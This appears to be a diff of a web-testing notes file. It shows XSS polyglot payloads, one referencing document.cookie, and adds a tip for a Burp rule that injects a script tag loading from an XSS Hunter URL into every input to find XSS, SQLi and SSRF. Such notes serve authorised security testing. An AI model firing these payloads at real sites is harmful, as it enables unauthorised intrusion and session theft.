@@ -74,6 +74,9 @@ onerror=alert(document.cookie);>
 )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--
 !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 
+I set up a Burp match and replace rule that turns XXX into: '"><script src="xsshunter url"></script><h1>test
+Then I just put 'FooXXX' into everything I see, and see what happens. That'll find most trivial XSS and SQLi. Then I look at file uploads for SSRF and such.
+
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/BurpSuite-ParamMiner
